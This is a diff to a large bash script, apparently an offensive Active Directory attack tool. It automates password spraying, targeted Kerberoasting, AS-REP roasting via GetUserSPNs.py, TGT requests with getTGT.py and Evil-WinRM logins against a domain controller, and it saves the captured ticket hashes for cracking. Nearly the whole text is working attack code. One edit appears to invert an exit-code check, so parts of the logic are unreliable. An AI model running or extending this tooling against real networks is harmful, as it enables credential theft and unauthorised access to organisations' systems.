@@ -54,7 +54,7 @@ if [ -n \"\$cracked\" ]; then
 
 gnome-terminal -- expect -c \"
 spawn s -t
-send \\\"0\\r\$DC\\r\$user\\r\$p\\r\$Ip\\r\$CLEAN_DOMAIN\\r\$Kerberos\\r\\\"
+send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
 interact
 \"
 EOT
@@ -69,6 +69,10 @@ p=\"'\$p'\"
 
 echo -e \"\e[1;32m[+] User: \$user\e[0m\"
 echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
+echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
+echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
+echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"
+
 echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
 
 evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"
@@ -145,7 +149,7 @@ if [ -n \"\$cracked\" ]; then
 
 gnome-terminal -- expect -c \"
 spawn s -t
-send \\\"0\\r\$DC\\r\$user\\r\$p\\r\$Ip\\r\$CLEAN_DOMAIN\\r\$Kerberos\\r\\\"
+send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
 interact
 \"
 EOF
@@ -160,6 +164,10 @@ p=\"'\$p'\"
 
 echo -e \"\e[1;32m[+] User: \$user\e[0m\"
 echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
+echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
+echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
+echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"
+
 echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
 
 evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"
@@ -231,7 +239,7 @@ if [ -n \"\$cracked\" ]; then
 
 gnome-terminal -- expect -c \"
 spawn s -t
-send \\\"0\\r\$DC\\r\$user\\r\$p\\r\$Ip\\r\$CLEAN_DOMAIN\\r\$Kerberos\\r\\\"
+send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
 interact
 \"
 EOT
@@ -246,6 +254,10 @@ p='\$p'
 
 echo -e '\e[1;32m[+] User: \$user\e[0m'
 echo -e '\e[1;32m[+] Password: \$p\e[0m'
+echo -e '\e[1;32m[+] DC: \$DC\e[0m'
+echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
+echo -e '\e[1;32m[+] Ip: \$Ip\e[0m'
+
 echo -e '\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m'
 
 evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"
@@ -316,7 +328,7 @@ cat << EOF > /tmp/temp1.sh
 
 gnome-terminal -- expect -c \"
 spawn s -t
-send \\\"0\\r\$DC\\r\$user\\r\$p\\r\$Ip\\r\$CLEAN_DOMAIN\\r\$Kerberos\\r\\\"
+send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
 interact
 \"
 EOF
@@ -333,10 +345,13 @@ p=\\\"$p\\\"
 
 echo -e '\\e[1;32m[+] User: '\$user'\\e[0m'
 echo -e '\\e[1;32m[+] Password: '\$p'\\e[0m'
+echo -e '\\e[1;32m[+] DC: '\$DC'\\e[0m'
+echo -e '\\e[1;32m[+] Domain: '\$CLEAN_DOMAIN'\\e[0m'
+echo -e '\\e[1;32m[+] Ip: '\$Ip'\\e[0m'
+
 echo -e '\\e[1;32m[+] Trying Evil-WinRM direct auth for '\$user' ...\\e[0m'
 
 evil-winrm -i '\$DC' -u '\$user' -p '\$p'
-
 if [ \$? -ne 0 ]; then
     echo ''
     echo -e '\\e[1;33m[!] Evil-WinRM failed for '\$user'. Trying getTGT.py and Kerberos auth ..\\e[0m'
@@ -409,7 +424,7 @@ if [ -n \"\$cracked\" ]; then
 
 gnome-terminal -- expect -c \"
 spawn s -t
-send \\\"0\\r\$DC\\r\$user\\r\$p\\r\$Ip\\r\$CLEAN_DOMAIN\\r\$Kerberos\\r\\\"
+send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
 interact
 \"
 EOT
@@ -424,6 +439,10 @@ p=\"'\$p'\"
 
 echo -e \"\e[1;32m[+] User: \$user\e[0m\"
 echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
+echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
+echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
+echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"
+
 echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
 
 evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"
@@ -504,7 +523,7 @@ if [ -n \"\$cracked\" ]; then
 
 gnome-terminal -- expect -c \"
 spawn s -t
-send \\\"0\\r\$DC\\r\$user\\r\$p\\r\$Ip\\r\$CLEAN_DOMAIN\\r\$Kerberos\\r\\\"
+send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
 interact
 \"
 EOF
@@ -521,11 +540,15 @@ export p='$p'
 
 echo -e '\e[1;32m[+] User: \$user\e[0m'
 echo -e '\e[1;32m[+] Password: \$p\e[0m'
+echo -e '\e[1;32m[+] DC: \$DC\e[0m'
+echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
+echo -e '\e[1;32m[+] Ip: \$Ip\e[0m'
+
 echo -e '\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m'
 
 evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"
 
-if [ \$? -ne 0 ]; then
+if [ \$? -ne 1 ]; then
     echo ''
     echo -e '\e[1;33m[!] Evil-WinRM failed for \$user. Trying getTGT.py and Kerberos auth ..\e[0m'
     echo ''
@@ -1270,7 +1293,7 @@ if [[ "$1" == "-t" ]]; then
                      CLEAN_DOMAIN="$DOMAIN"
                 fi
             fi            
-	    sudo ntpdate -s $DC
+            sudo ntpdate -s $DC 
 	    echo ""
             echo -e "\033[36m[+]-- Running nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf $flag --[+]\033[0m"
             echo ""
@@ -1468,15 +1491,23 @@ exec bash
                   echo ""
                   while read -r u; do 
                       while read -r p; do
+                          if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                              echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                              getTGT.py $CLEAN_DOMAIN/$u:$p -dc-ip $DC -k 2>/dev/null
+                              if [ -f "$u.ccache" ]; then
+                              	 export KRB5CCNAME="$u.ccache"
+                              fi
+                              echo ""  
+                          fi     
                           python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $u -p $p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$u 2>/dev/null
                           grep '^\$krb5tgs\$' /tmp/.tgs.$u > /tmp/.tgs1.txt.$u
                           cat /tmp/.tgs1.txt.$u
                           cp /tmp/.tgs1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null 
-            	          if [ -s /tmp/.tgs1.txt.$u ]; then 
+                          if [ -s /tmp/.tgs1.txt.$u ]; then 
                               echo "$u" > /tmp/.current_u.txt
-	                      targeted_kerberoast_check
+                              targeted_kerberoast_check
                               break
-            		  fi
+                          fi
                       done < $Password
                   done < /tmp/.test1_nxc_rid_brute
                 else
@@ -1484,6 +1515,14 @@ exec bash
                   echo ""
                   while read -r u; do
                       while read -r p; do
+                          if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                              echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                              getTGT.py $CLEAN_DOMAIN/$u:$p -dc-ip $DC -k 2>/dev/null
+                              if [ -f "$u.ccache" ]; then
+                                 export KRB5CCNAME="$u.ccache"
+                              fi
+                              echo ""  
+                          fi     
                           python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $u -p $p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$u 2>/dev/null
                           grep '^\$krb5tgs\$' /tmp/.tgs.$u > /tmp/.tgs1.txt.$u 
                           cat /tmp/.tgs1.txt.$u 
@@ -1491,8 +1530,8 @@ exec bash
                           if [ -s /tmp/.tgs1.txt.$u ]; then 
                               echo "$u" > /tmp/.current_u.txt  
                               targeted_kerberoast_check
-			      break
-                          fi                      
+                              break
+                          fi
                       done < $Password
                   done < $User
                 fi
@@ -1501,30 +1540,46 @@ exec bash
                   echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u /tmp/.test1_nxc_rid_brute -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m" 
                   echo ""
                   for i in $(cat /tmp/.test1_nxc_rid_brute); do
+                      if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                            echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                            getTGT.py $CLEAN_DOMAIN/$i:$Password -dc-ip $DC -k 2>/dev/null
+                            if [ -f "$i.ccache" ]; then
+                                  export KRB5CCNAME="$i.ccache"
+                            fi
+                            echo ""  
+                      fi     
                       python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $i -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$i 2>/dev/null
                       grep '^\$krb5tgs\$' /tmp/.tgs.$i > /tmp/.tgs1.txt.$i
                       cat /tmp/.tgs1.txt.$i
- 		      cp /tmp/.tgs1.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
+                      cp /tmp/.tgs1.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                       if [ -s /tmp/.tgs1.txt.$i ]; then 
- 			  u="$i"
+                          u="$i"
                           echo "$u" > /tmp/.current_u.txt
                           targeted_kerberoast_check
-			  break
-                      fi                  
+                          break
+                      fi
                   done 
                 else
                   echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m"
                   echo ""
                   for i in $(cat $User); do
+                      if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                            echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                            getTGT.py $CLEAN_DOMAIN/$i:$Password -dc-ip $DC -k 2>/dev/null
+                            if [ -f "$i.ccache" ]; then
+                                export KRB5CCNAME="$i.ccache"
+                            fi
+                            echo ""  
+                      fi     
                       python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $i -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$i 2>/dev/null
                       grep '^\$krb5tgs\$' /tmp/.tgs.$i > /tmp/.tgs1.txt.$i
                       cat /tmp/.tgs1.txt.$i
- 	              cp /tmp/.tgs1.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
+                      cp /tmp/.tgs1.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                       if [ -s /tmp/.tgs1.txt.$i ]; then
                               u="$i"
                               echo "$u" > /tmp/.current_u.txt 
                               targeted_kerberoast_check
-			      break
+                              break
                       fi           
                   done 
                 fi 
@@ -1534,14 +1589,22 @@ exec bash
                   echo ""
                   while read -r u; do
                       while read -r p; do
+                          if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                                echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                                getTGT.py $CLEAN_DOMAIN/$u:$p -dc-ip $DC -k 2>/dev/null
+                                if [ -f "$u.ccache" ]; then
+                                    export KRB5CCNAME="$u.ccache"
+                                fi
+                                echo ""  
+                          fi     
                           python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $u -p $p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$u  2>/dev/null
                           grep '^\$krb5tgs\$' /tmp/.tgs.$u  > /tmp/.tgs1.txt.$u 
                           cat /tmp/.tgs1.txt.$u 
- 			  cp /tmp/.tgs1.txt.$u  $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
+                          cp /tmp/.tgs1.txt.$u  $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                           if [ -s /tmp/.tgs1.txt.$u ]; then 
                               echo "$u" > /tmp/.current_u.txt
                               targeted_kerberoast_check
-			      break
+                              break
                           fi          
                       done < $Password
                   done < /tmp/.test1_nxc_rid_brute
@@ -1549,12 +1612,20 @@ exec bash
                   echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m"
                   echo ""
                   for i in $(cat $Password); do
+                      if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                          echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                          getTGT.py $CLEAN_DOMAIN/$User:$i -dc-ip $DC -k 2>/dev/null
+                          if [ -f "$User.ccache" ]; then
+                              export KRB5CCNAME="$User.ccache"
+                          fi
+                          echo ""  
+                      fi     
                       python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $User -p $i -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$User 2>/dev/null
                       grep '^\$krb5tgs\$' /tmp/.tgs.$User > /tmp/.tgs1.txt.$User
                       cat /tmp/.tgs1.txt.$User
- 	              cp /tmp/.tgs1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
+                      cp /tmp/.tgs1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                       if [ -s /tmp/.tgs1.txt.$User ]; then 
- 			    u="$User" 
+                            u="$User" 
                             echo "$u" > /tmp/.current_u.txt
                             targeted_kerberoast_check
                             break
@@ -1565,19 +1636,21 @@ exec bash
                 echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m"
                 echo ""
                 if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
-                        echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
-                        getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k
-                        export KRB5CCNAME=$User.ccache
-			echo ""  
+                      echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                      getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k 2>/dev/null
+                      if [ -f "$User.ccache" ]; then
+                          export KRB5CCNAME="$User.ccache"
+                      fi
+                      echo ""  
                 fi     
                 python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$User 2>/dev/null
                 grep '^\$krb5tgs\$' /tmp/.tgs.$User > /tmp/.tgs1.txt.$User
                 cat /tmp/.tgs1.txt.$User
-	        cp /tmp/.tgs1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
+                cp /tmp/.tgs1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                 echo "" 
                 if [ -s /tmp/.tgs1.txt.$User ]; then
                       u="$User" 
-		      echo "$u" > /tmp/.current_u.txt
+                      echo "$u" > /tmp/.current_u.txt
                       targeted_kerberoast_check
                 fi            
             fi  
@@ -1596,7 +1669,7 @@ exec bash
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN//tmp/.test1_nxc_rid_brute:$Password -request $dc_host $flag --[+]\033[0m"
                       while read -r u; do
                           while read -r p; do
-                              GetUserSPNs.py $CLEAN_DOMAIN/$u:$p -request $dc_host $flag
+                              GetUserSPNs.py $CLEAN_DOMAIN/$u:$p -request $dc_host $flag 2>/dev/null
                           done < $Password
                       done < /tmp/.test1_nxc_rid_brute
                       echo ""
@@ -1604,7 +1677,7 @@ exec bash
                       for i in $(cat /tmp/.test1_nxc_rid_brute); do
                           echo ""
                           echo -e "\033[36m$i\033[0m" 
-                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
+                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                           if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                              cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                              echo "$i" > /tmp/.current_i.txt
@@ -1627,14 +1700,14 @@ exec bash
                       fi
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN//tmp/.test1_nxc_rid_brute:$Password -request $dc_host $flag --[+]\033[0m"
                       while read -r u; do
-                          GetUserSPNs.py $CLEAN_DOMAIN/$u:$Password -request $dc_host $flag
+                          GetUserSPNs.py $CLEAN_DOMAIN/$u:$Password -request $dc_host $flag 2>/dev/null
                       done < /tmp/.test1_nxc_rid_brute
                       echo ""
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                       for i in $(cat /tmp/.test1_nxc_rid_brute); do
                           echo ""
                           echo -e "\033[36m$i\033[0m"
-                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
+                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                           if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                               cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                               echo "$i" > /tmp/.current_i.txt
@@ -1657,14 +1730,14 @@ exec bash
                       fi
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                           while read -r p; do
-                               GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag
+                               GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag 2>/dev/null
                           done < $Password
                       echo ""
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                       for i in $(cat /tmp/.test1_nxc_rid_brute); do
                           echo ""
                           echo -e "\033[36m$i\033[0m"
-                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
+                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
          		  if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                              cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                              echo "$i" > /tmp/.current_i.txt
@@ -1686,13 +1759,13 @@ exec bash
                           getnpusers_check
                       fi
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
-                      GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag
+                      GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null
                       echo ""
                       echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                       for i in $(cat /tmp/.test1_nxc_rid_brute); do
                           echo ""
                           echo -e "\033[36m$i\033[0m"
-                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
+                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                   	  if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                              cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                              echo "$i" > /tmp/.current_i.txt
@@ -1709,7 +1782,7 @@ exec bash
                     echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                     while read -r u; do 
                         while read -r p; do
-                           GetUserSPNs.py $CLEAN_DOMAIN/$u:$p -request $dc_host $flag
+                           GetUserSPNs.py $CLEAN_DOMAIN/$u:$p -request $dc_host $flag 2>/dev/null
                         done < $Password
                     done < $User
                     echo ""
@@ -1727,7 +1800,7 @@ exec bash
                     for i in $(cat $User); do
                         echo ""
                         echo -e "\033[36m$i\033[0m"
-                        GetUserSPNs.py -no-preauth "$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
+                        GetUserSPNs.py -no-preauth "$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                         if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                             cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                             echo "$i" > /tmp/.current_i.txt
@@ -1753,7 +1826,7 @@ exec bash
                     for i in $(cat $User); do
                         echo ""
                         echo -e "\033[36m$i\033[0m"
-                        GetUserSPNs.py -no-preauth "$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
+                        GetUserSPNs.py -no-preauth "$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                  	if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                            cp /tmp/.getuserspn.txt /tmp/.getuserspn1.txt.$i
                            echo "$i" > /tmp/.current_i.txt
@@ -1767,16 +1840,16 @@ exec bash
                         echo ""
                         echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
                             while read -r p; do
-                                GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag
+                                GetUserSPNs.py $CLEAN_DOMAIN/$User:$p -request $dc_host $flag 2>/dev/null
                             done < $Password
                         echo ""
                 else
                         echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
-                        GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag
+                        GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null
                         echo ""
                 fi
             fi
-            echo ""
+            echo ""            
        done
     elif [[ "$tool" == "1" ]]; then
            while true; do 
@@ -5005,6 +5078,14 @@ if [[ -f "$User" && -f "$Password" ]]; then
         echo ""
         while read -r u; do 
             while read -r p; do
+		if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                    echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                    getTGT.py $CLEAN_DOMAIN/\$u:\$p -dc-ip $DC -k 2>/dev/null
+	            if [ -f "\$u.ccache" ]; then
+    	                export KRB5CCNAME="\$u.ccache"
+		    fi
+                    echo ""  
+    		fi   
                 python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$u -p \$p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$u 2>/dev/null
                 grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$u  > /tmp/.tgs1.txt.\$u 
                 cat /tmp/.tgs1.txt.\$u 
@@ -5021,6 +5102,14 @@ if [[ -f "$User" && -f "$Password" ]]; then
         echo ""
         while read -r u; do
             while read -r p; do
+                if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                    echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                    getTGT.py $CLEAN_DOMAIN/\$u:\$p -dc-ip $DC -k 2>/dev/null
+                    if [ -f "\$u.ccache" ]; then
+                        export KRB5CCNAME="\$u.ccache"
+                    fi
+                    echo ""  
+                fi   
                 python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$u -p \$p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$u 2>/dev/null
                 grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$u > /tmp/.tgs1.txt.\$u 
                 cat /tmp/.tgs1.txt.\$u
@@ -5037,6 +5126,14 @@ elif [[ -f "$User" ]]; then
         echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u /tmp/.test1_nxc_rid_brute -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m" 
         echo "" 
         for i in \$(cat /tmp/.test1_nxc_rid_brute); do
+            if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                 echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                 getTGT.py $CLEAN_DOMAIN/\$i:$Password -dc-ip $DC -k 2>/dev/null
+                 if [ -f "\$i.ccache" ]; then
+                      export KRB5CCNAME="\$i.ccache"
+                 fi
+                 echo ""  
+            fi   
             python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$i -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$i 2>/dev/null
             grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$i > /tmp/.tgs1.txt.\$i 
             cat /tmp/.tgs1.txt.\$i
@@ -5052,6 +5149,14 @@ elif [[ -f "$User" ]]; then
         echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host \"$DC\" -u \"$User\" -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m"
         echo ""
         for i in \$(cat $User); do
+ 	    if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                 echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                 getTGT.py $CLEAN_DOMAIN/\$i:$Password -dc-ip $DC -k 2>/dev/null
+                 if [ -f "\$i.ccache" ]; then
+                       export KRB5CCNAME="\$i.ccache"
+                 fi
+                 echo ""  
+            fi   
             python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$i -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$i 2>/dev/null
             grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$i > /tmp/.tgs1.txt.\$i
             cat /tmp/.tgs1.txt.\$i
@@ -5070,6 +5175,14 @@ elif [[ -f "$Password" ]]; then
         echo ""
         while read -r u; do
             while read -r p; do
+ 	        if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                     echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                     getTGT.py $CLEAN_DOMAIN/\$u:\$p -dc-ip $DC -k 2>/dev/null
+                     if [ -f "\$u.ccache" ]; then
+                        export KRB5CCNAME="\$u.ccache"
+                     fi
+               	     echo ""  
+            	fi   
                 python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u \$u -p \$p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$u 2>/dev/null
                 grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$u > /tmp/.tgs1.txt.\$u
                 cat /tmp/.tgs1.txt.\$u
@@ -5085,6 +5198,14 @@ elif [[ -f "$Password" ]]; then
         echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host \"$DC\" -u \"$User\" -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m"
         echo ""
         for i in \$(cat $Password); do
